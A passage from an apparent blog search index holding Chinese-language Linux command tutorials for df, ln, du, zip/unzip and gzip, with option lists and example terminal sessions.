13% /var/dev/sda6 19840892 1977568 16839184 11% /usr/dev/sda3 988116 23880 913232 3% /boottmpfs 16473212 0 16473212 0% /dev/shm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-h更具目前磁盘空间和使用情况 以更易读的方式显示 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-H根上面的-h参数相同,不过在根式化的时候,采用1000而不是1024进行容量转换 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-k以单位显示磁盘的使用情况 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-l显示本地的分区的磁盘空间使用率,如果服务器nfs了远程服务器的磁盘,那么在df上加上-l后系统显示的是过滤nsf驱动器后的结果 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-i显示inode的使用情况。linux采用了类似指针的方式管理磁盘空间影射.这也是一个比较关键应用]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ln]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F37.%20Linux%20%E5%91%BD%E4%BB%A4-%20ln%2F</url>
    <content type="text"><![CDATA[Linux 命令- ln&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ln 是 Linux 中又一个非常重要的命令，它的功能的功能是为某一个文件在另一个位置建立一个同步的连接。当需要在不同的目录，用到相同的文件时，就不需要在每个需要的目录下都放一个必须相同的文件，只要在某个固定的目录，放上该文件，然后在其他的目录下用 ln 命令连接（link）就可以，不必重复的占用磁盘空间。 1.命令格式1ln [参数] [源文件或目录] [目标文件或目录] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 文件系统中，有所谓的连接（link），可以将其视为档案的别名。而连接有可分为两种：硬链接（hard link）与软连接（symbolic link），硬连接的意思是一个档案可以有多个名称，而软连接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置。硬链接是存在同一个文件系统中，而软连接却可以跨越不同的文件系统。 软连接 软连接，一路径的形式存在。类似与 windows 系统中的快捷方式； 软连接可以跨文件系统，硬链接不可以； 软连接可以对一个不存在的文件名进行连接； 4.软连接可以对目录进行连接 硬链接 硬链接，以文件副本的形式存在。但不占用实际空间； 不允许给目录创建硬链接； 硬链接只有在同一个文件系统中才能创建。 注意 ln 命令会保持每一处连接文件的同步性，也就是说，不论改动了哪一处，其他的文件都会发生相同的变化； ln 的连接又分软连接和硬链接两种，软连接就是 ln -s [源文件] [目标文件] ，它只会在选定的位置上生成一个文件的镜像，不回占用磁盘空间，硬链接 ln [源文件] [目标文件] ，没有参数 -s ，会在选定的文职上生成一个和源文件大小相同的文件，无论是软连接还是硬链接，文件都保持同步变化。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ln 指令在连接文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个存在的目录，则会把前面指定的所有文件或目录复制到该目录中。若同时指定多个文件或目录，且最后的目的地并非是有一个已存在的目录，则会出现错误信息。 3.命令参数必要参数 -b 删除，覆盖以前建立的链接 -d 允许超级用户制作目录的硬链接 -f 强制执行 -i 交互模式，文件存在则提示用户是否覆盖 -n 把符号链接视为一般目录 -s 软链接(符号链接) -v 显示详细的处理过程 选择参数 -S “-S&lt;字尾备份字符串&gt; ”或 “–suffix=&lt;字尾备份字符串&gt;” -V “-V&lt;备份方式&gt;”或“–version-control=&lt;备份方式&gt;” –help 显示帮助信息 –version 显示版本信息 使用实例实例1：给文件创建软连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ln -s log2013.log link2013 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# ll-rw-r--r-- 1 root bin 61 11-13 06:03 log2013.log[root@localhost test]# ln -s log2013.log link2013[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为 log2013.log 文件创建软连接 link2013 ，如果 log2013.log 丢失，link2013 将失效。 实例2：给文件创建硬连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ln log2013.log ln2013 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 log2013.log[root@localhost test]# ln log2013.log ln2013[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 2 root bin 61 11-13 06:03 ln2013-rw-r--r-- 2 root bin 61 11-13 06:03 log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为 log2013.log 创建硬链接 ln2013 ，log2013.log 与ln2013 的各项属性相同。 实例3：接上面两实例，连接完毕后，删除和重建连接源文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 2 root bin 61 11-13 06:03 ln2013-rw-r--r-- 2 root bin 61 11-13 06:03 log2013.log[root@localhost test]# rm -rf log2013.log [root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 ln2013[root@localhost test]# touch log2013.log[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 ln2013---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 0 12-07 16:19 log2013.log[root@localhost test]# vi log2013.log 2013-012013-022013-032013-042013-052013-062013-072013-082013-092013-102013-112013-12[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 ln2013-rw-r--r-- 1 root root 96 12-07 16:21 log2013.log[root@localhost test]# cat link2013 2013-012013-022013-032013-042013-052013-062013-072013-082013-092013-102013-112013-12[root@localhost test]# cat ln2013 hostnamebaidu=baidu.comhostnamesina=sina.comhostnames=true &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1.源文件被删除后，并没有影响硬链接文件；软连接文件在 conetos 系统下不断的闪烁，提示远未见已经不存在 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.重建源文件后，团连接不再闪烁提示，说明已经连接成功，找到了连接文件系统；重建后，硬链接文件并没有收到源文件影响，硬链接文件的内容还是保留了删除前源文件的内容，说明硬链接已经失效。 实例4：将文件链接为另一个目录中的相同名字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ln log2013.log test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526[root@localhost test]# ln log2013.log test3[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 ln2013-rw-r--r-- 2 root root 96 12-07 16:21 log2013.log[root@localhost test]# cd test3[root@localhost test3]# ll-rw-r--r-- 2 root root 96 12-07 16:21 log2013.log[root@localhost test3]# vi log2013.log 2013-012013-022013-032013-042013-052013-062013-072013-082013-092013-10[root@localhost test3]# ll-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log[root@localhost test3]# cd ..[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 ln2013-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 test3 目录中创建了 log2013.log 的硬链接，修改 test3 目录中的 log2013.log 文件，同时也会同步到源文件 实例5：给目录创建软连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ln -sv /opt/soft/test/test3 /opt/soft/test/test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930[root@localhost test]# lldrwxr-xr-x 2 root root 4096 12-07 16:36 test3drwxr-xr-x 2 root root 4096 12-07 16:57 test5[root@localhost test]# cd test5[root@localhost test5]# lllrwxrwxrwx 1 root root 5 12-07 16:57 test3 -&gt; test3[root@localhost test5]# cd test3-bash: cd: test3: 符号连接的层数过多[root@localhost test5]# [root@localhost test5]# [root@localhost test5]# lllrwxrwxrwx 1 root root 5 12-07 16:57 test3 -&gt; test3[root@localhost test5]# rm -rf test3[root@localhost test5]# ll[root@localhost test5]# ln -sv /opt/soft/test/test3 /opt/soft/test/test5创建指向“/opt/soft/test/test3”的符号链接“/opt/soft/test/test5/test3”[root@localhost test5]# lllrwxrwxrwx 1 root root 20 12-07 16:59 test3 -&gt; /opt/soft/test/test3[root@localhost test5]# [root@localhost test5]# cd test3[root@localhost test3]# ll总计 4-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log[root@localhost test3]# touch log2014.log[root@localhost test3]# ll总计 4-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log-rw-r--r-- 1 root root 0 12-07 17:05 log2014.log[root@localhost test3]# cd ..[root@localhost test5]# cd .. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 目录只能创建软连接 目录创建链接必须用绝对路径，相对路径创建会不成功，会提示：符号连接的层数过多 ，这样的错误 在连接目标目录中修改文件都会在源文件目录中同步变化]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- du]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F36.%20Linux%20%E5%91%BD%E4%BB%A4-%20du%2F</url>
    <content type="text"><![CDATA[Linux 命令- du&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux du 命令也是查看是有那个空间的，但是与 df 命令不同的是对文件和目录磁盘使用的空间的查看，还是和 df 命令有一写区别的。 1.命令格式1du [选项] [文件] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示每个文件和目录的磁盘使用空间。 3.命令参数 -a或-all 显示目录中个别文件的大小。 -b或-bytes 显示目录或文件大小时，以byte为单位。 -c或–total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。 -k或–kilobytes 以KB(1024bytes)为单位输出。 -m或–megabytes 以MB为单位输出。 -s或–summarize 仅显示总计，只列出最后加总的值。 -h或–human-readable 以K，M，G为单位，提高信息的可读性。 -x或–one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。 -L&lt;符号链接&gt;或–dereference&lt;符号链接&gt; 显示选项中所指定符号链接的源文件大小。 -S或–separate-dirs 显示个别目录的大小时，并不含其子目录的大小。 -X&lt;文件&gt;或–exclude-from=&lt;文件&gt; 在&lt;文件&gt;指定目录或文件。 –exclude=&lt;目录或文件&gt; 略过指定的目录或文件。 -D或–dereference-args 显示指定符号链接的源文件大小。 -H或–si 与-h参数相同，但是K，M，G是以1000为换算单位。 -l或–count-links 重复计算硬件链接的文件。 4.使用实例实例1：显示目录或者文件所占空间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost test]# du608 ./test6308 ./test44 ./scf/lib4 ./scf/service/deploy/product4 ./scf/service/deploy/info12 ./scf/service/deploy16 ./scf/service4 ./scf/doc4 ./scf/bin32 ./scf8 ./test31288 .[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只显示当前目录下面的子目录的目录大小和当前目录的总的大小，最下面的 1288 为当前目录的总大小。 实例2：显示指定文件所占空间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost test]# du log2012.log 300 log2012.log[root@localhost test]# 实例3：查看指定目录的所占空间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du scf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost test]# du scf4 scf/lib4 scf/service/deploy/product4 scf/service/deploy/info12 scf/service/deploy16 scf/service4 scf/doc4 scf/bin32 scf[root@localhost test]# 实例4：显示多个文件所占空间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du log30.tar.gz log31.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# du log30.tar.gz log31.tar.gz 4 log30.tar.gz4 log31.tar.gz[root@localhost test]# 实例5：只显示总和的大小&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du -s &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost test]# du -s1288 .[root@localhost test]# du -s scf32 scf[root@localhost test]# cd ..[root@localhost soft]# du -s test1288 test[root@localhost soft]# 实例6：方便阅读的格式显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du -h test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost soft]# du -h test608K test/test6308K test/test44.0K test/scf/lib4.0K test/scf/service/deploy/product4.0K test/scf/service/deploy/info12K test/scf/service/deploy16K test/scf/service4.0K test/scf/doc4.0K test/scf/bin32K test/scf8.0K test/test31.3M test[root@localhost soft]# 实例7：文件和目录都显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du -ah test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526272829303132333435363738[root@localhost soft]# du -ah test4.0K test/log31.tar.gz4.0K test/test13.tar.gz0 test/linklog.log0 test/test6/log2014.log300K test/test6/linklog.log0 test/test6/log2015.log4.0K test/test6/log2013.log300K test/test6/log2012.log0 test/test6/log2017.log0 test/test6/log2016.log608K test/test60 test/log2015.log0 test/test4/log2014.log4.0K test/test4/log2013.log300K test/test4/log2012.log308K test/test44.0K test/scf/lib4.0K test/scf/service/deploy/product4.0K test/scf/service/deploy/info12K test/scf/service/deploy16K test/scf/service4.0K test/scf/doc4.0K test/scf/bin32K test/scf4.0K test/log2013.log300K test/log2012.log0 test/log2017.log0 test/log2016.log4.0K test/log30.tar.gz4.0K test/log.tar.bz24.0K test/log.tar.gz0 test/test3/log2014.log4.0K test/test3/log2013.log8.0K test/test34.0K test/scf.tar.gz1.3M test[root@localhost soft]# 实例8：显示几个文件或目录各自占用磁盘空间的大小，还统计它们的综合&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du -c log30.tar.gz log31.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# du -c log30.tar.gz log31.tar.gz 4 log30.tar.gz4 log31.tar.gz8 总计[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上 -c 选项后，du 不仅先死两个目录各自占用磁盘空间的大小，还在最后一行统计它们的总和。 实例9：按照空间大小排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du|sort -nr|more &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost test]# du|sort -nr|more1288 .608 ./test6308 ./test432 ./scf16 ./scf/service12 ./scf/service/deploy8 ./test34 ./scf/service/deploy/product4 ./scf/service/deploy/info4 ./scf/lib4 ./scf/doc4 ./scf/bin[root@localhost test]# 实例10：输出当前目录下各个子目录所使用的空间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du -h --max-depth=1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test]# du -h --max-depth=1608K ./test6308K ./test432K ./scf8.0K ./test31.3M .[root@localhost test]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- zip 和 unzip]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F34.%20Linux%20%E5%91%BD%E4%BB%A4-%20zip%20%E5%92%8C%20unzip%2F</url>
    <content type="text"><![CDATA[Linux 命令- zip 和 unzipzip 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zip 压缩目录也可以压缩文件，压缩目录时，需要指定目录下的文件 1.命令格式1zip [参数] [压缩名] [文件或目录] 2.命令参数 -A 调整可执行的自动解压缩文件。 -b&lt;工作目录&gt; 指定暂时存放文件的目录。 -c 替每个被压缩的文件加上注释。 -d 从压缩文件内删除指定的文件。 -D 压缩文件内不建立目录名称。 -f 此参数的效果和指定”-u”参数类似，但不仅更新既有文件，如果某些文件原本不存在于压缩文件内，使用本参数会一并将其加入压缩文件中。 -F 尝试修复已损坏的压缩文件。 -g 将文件压缩后附加在既有的压缩文件之后，而非另行建立新的压缩文件。 - -h 在线帮助。 -i&lt;范本样式&gt; 只压缩符合条件的文件。 -j 只保存文件名称及其内容，而不存放任何目录名称。 -J 删除压缩文件前面不必要的数据。 -k 使用MS-DOS兼容格式的文件名称。 -l 压缩文件时，把LF字符置换成LF+CR字符。 -ll 压缩文件时，把LF+CR字符置换成LF字符。 -L 显示版权信息。 -m 将文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中。 -n&lt;字尾字符串&gt; 不压缩具有特定字尾字符串的文件。 -o 以压缩文件内拥有最新更改时间的文件为准，将压缩文件的更改时间设成和该文件相同。 -q 不显示指令执行过程。 -r 递归处理，将指定目录下的所有文件和子目录一并处理。 -S 包含系统和隐藏文件。 -t&lt;日期时间&gt; 把压缩文件的日期设成指定的日期。 -T 检查备份文件内的每个文件是否正确无误。 -u 更换较新的文件到压缩文件内。 -v 显示指令执行过程或显示版本信息。 -V 保存VMS操作系统的文件属性。 -w 在文件名称里假如版本编号，本参数仅在VMS操作系统下有效。 -x&lt;范本样式&gt; 压缩时排除符合条件的文件。 -X 不保存额外的文件属性。 -y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。 -z 替压缩文件加上注释。 -$ 保存第一个被压缩文件所在磁盘的卷册名称。 -&lt;压缩效率&gt; 压缩效率是一个介于1-9的数值。 3.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zip 是个使用广泛的压缩程序，文件经它压缩后会另外产生具有 “.zip” 扩展名的压缩文件。 4.使用实例实例1：将 test.txt 文件压缩为 test.zip 文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip test.zip test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost test]# zip test.zip test.txtadding: test.txt (deflated 35%) 实例2：压缩率为1，压缩 test.txt 文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip -1 test.zip test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost test]# zip -1 test.zip test.txtadding: test.txt(deflated 35%) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩率为1，最高压缩率，当然也是最慢的压缩方法。但上例压缩率依然为35，因为压缩文件为文本文件，压缩率基本不变。 实例3：递归压缩子目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip -r test.zip /test/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# zip -r test.zip /test/adding: test/ (stored 0%)adding: test/test/ (stored 0%)adding: test/test.txt (deflated 35%) 实例4：删除已有 zip 文件中文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip -d test.zip test/test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# zip -r test.zip testadding: test/ (stored 0%)adding: test/test/ (stored 0%)adding: test/test.txt (deflated 35%)[root@localhost test]# zip -d test.zip test/test.txtdeleting: test/test.txt 实例5：向已有 zip 文件增加压缩文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip -m test.zip ./test/test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost test]# zip -m test.zip ./test/test.txtadding: test/test.txt (deflated 35%) 实例6：排除指定文件不压缩&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip -r test.zip test-x ./test/test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# zip -r test.zip test-x ./test/test.txtupdating: test/ (stored 0%)updating: test/test/ (stored 0%)updating: test/test2.txt (deflated 63%) unzip 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;unzip 用来解压 zip 压缩的压缩文件 1.命令格式1unzip [参数] [.zip文件] [目录] 2.命令参数 -c 将 解压缩的结果显示到屏幕上，并对字符做适当的转换。 -f 更 新现有的文件。 -l 显 示压缩文件内所包含的文件。 -p 与-c参数类似，会将解压缩的结果显示到屏幕上，但不会执行任 何的转换。 -t 检 查压缩文件是否正确。，但不解压。 -u 与-f参数类似，但是除了更新现有的文件外，也会将压缩文件中 的其他文件解压缩到目录中。 -v 执 行是时显示详细的信息。或查看压缩文件目录，但不解压。 -z 仅 显示压缩文件的备注文字。 -a 对 文本文件进行必要的字符转换。 -b 不 要对文本文件进行字符转换。 -C 压 缩文件中的文件名称区分大小写。 -j 不 处理压缩文件中原有的目录路径。 -L 将 压缩文件中的全部文件名改为小写。 -M 将 输出结果送到more程 序处理。 -n 解 压缩时不要覆盖原有的文件。 -o 不 必先询问用户，unzip执 行后覆盖原有文件。 -P&lt;密码&gt; 使 用zip的密码选项。 -q 执 行时不显示任何信息。 -s 将 文件名中的空白字符转换为底线字符。 -V 保 留VMS的文件版本信 息。 -X 解 压缩时同时回存文件原来的UID/GID。 [.zip文件] 指定.zip压缩文件。 [文件] 指定 要处理.zip压缩文 件中的哪些文件。 -d&lt;目录&gt; 指 定文件解压缩后所要存储的目录。 -x&lt;文件&gt; 指 定不要处理.zip压 缩文件中的哪些文件。 -Z unzip -Z等 于执行zipinfo指 令。 3.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;unzip 为 zip 压缩文件的解压缩程序。 4.使用实例实例1：解压缩 test.zip&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1unzip test.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# unzip test.zipArchive: test.zipcreating: test/creating: test/test/inflating: test/test2.txt 实例2：查看压缩文件目录及文件信息，并不解压&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1unzip -v test.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost test]# unzip -v test.zipArchive: test.zipLength Method Size Cmpr Date Time CRC-32 Name-------- ------ ------- ---- --------------- -------- ----0 Stored 0 0% 10-08-2015 22:41 00000000 test/0 Stored 0 0% 10-08-2015 22:24 00000000 test/test/2117 Defl:N 781 63% 10-08-2015 22:41 ef2699cd test/test2.txt-------- ------- --- -------2117 781 63% 3 files 其他应用1.将压缩文件 test.zip 在指定目录 /tmp/ 下解压，如果有相同的文件存在，要求 unzip 命令不覆盖原来的文件1[root@mysql test]# unzip -n test.zip -d /tmp 2.将压缩文件 test.zip 在指定目录 /tmp/ 下解压缩，如果有相同文件存在，要求 unzip 命令 覆盖原来的文件1[root@mysql test]# unzip -o test.zip -d /tmp 使用 unzip “*.zip” 解压当前目录下的所有 zip 文件1ls *.zip |xargs -nl unzip]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- gzip]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F32.%20Linux%20%E5%91%BD%E4%BB%A4-%20gzip%2F</url>
    <content type="text"><![CDATA[Linux 命令- gzip&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;减少文件大小有两个明显的好处，一是可以减少存储空间，二是通过网络传输文件时，可以减少传输的时间。gzip是在Linux系统中经常使用的一个对文件进行压缩和解压缩的命令，既方便又好用。gzip不仅可以用来压缩大的、较少使用的文件以节省磁盘空间，还可以和tar命令一起构成Linux操作系统中比较流行的压缩文件格式。据统计，gzip命令对文本文件有60%～70%的压缩率。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;gzip 不能压缩目录 1.命令格式1gzip [参数] [文件] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;gzip 是个使用广泛的压缩程序，文件经它压缩后，其名称后面会多出 “.gz” 的扩展名。 3.命令参数 -a或–ascii 使用ASCII文字模式。 -c或–stdout或–to-stdout 把压缩后的文件输出到标准输出设备，不去更动原始文件。 -d或–decompress或—-uncompress 解开压缩文件。 -f或–force 强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接。 -h或–help 在线帮助。 -l或–list 列出压缩文件的相关信息。 -L或–license 显示版本与版权信息。 -n或–no-name 压缩文件时，不保存原来的文件名称及时间戳记。 -N或–name 压缩文件时，保存原来的文件名称及时间戳记。 -q或–quiet 不显示警告信息。 -r或–recursive 递归处理，将指定目录下的所有文件及子目录一并处理。 -S&lt;压缩字尾字符串&gt;或—-suffix&lt;压缩字尾字符串&gt; 更改压缩字尾字符串。 -t或–test 测试压缩文件是否正确无误。 -v或–verbose 显示指令执行过程。 -V或–version 显示版本信息。 -num 用指定的数字num调整压缩的速度，-1或–fast表示最快压缩方法（低压缩比），-9或–best表示最慢压缩方法（高压缩比）。系统缺省值为6。 4.使用实例实例1.把 test6 目录下的每个文件压缩成 .gz 文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip * &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 mail users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log[root@localhost test6]# gzip *[root@localhost test6]# ll总计 28---xr--r-- 1 root mail 1341 11-30 08:39 linklog.log.gz---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz-rw-r--r-- 1 mail users 70 11-30 08:39 log2013.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2014.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2015.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2016.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2017.log.gz[root@localhost test6]# 实例2：把例1中每个压缩的文件解压，并列出详细的信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -dv * &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627[root@localhost test6]# ll总计 28---xr--r-- 1 root mail 1341 11-30 08:39 linklog.log.gz---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz-rw-r--r-- 1 mail users 70 11-30 08:39 log2013.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2014.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2015.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2016.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2017.log.gz[root@localhost test6]# gzip -dv *linklog.log.gz: 99.6% -- replaced with linklog.loglog2012.log.gz: 99.6% -- replaced with log2012.loglog2013.log.gz: 47.5% -- replaced with log2013.loglog2014.log.gz: 0.0% -- replaced with log2014.loglog2015.log.gz: 0.0% -- replaced with log2015.loglog2016.log.gz: 0.0% -- replaced with log2016.loglog2017.log.gz: 0.0% -- replaced with log2017.log[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 mail users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log[root@localhost test6]# 实例3：详细显示例1中诶每个压缩的文件的信息，并不解压&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -l * &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost test6]# gzip -l * compressed uncompressed ratio uncompressed_name 1341 302108 99.6% linklog.log 1341 302108 99.6% log2012.log 70 61 47.5% log2013.log 32 0 0.0% log2014.log 32 0 0.0% log2015.log 32 0 0.0% log2016.log 32 0 0.0% log2017.log 2880 604277 99.5% (totals) 实例4：压缩一个 tar 备份文件，此时压缩文件的扩展名为 .tar.gz&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip 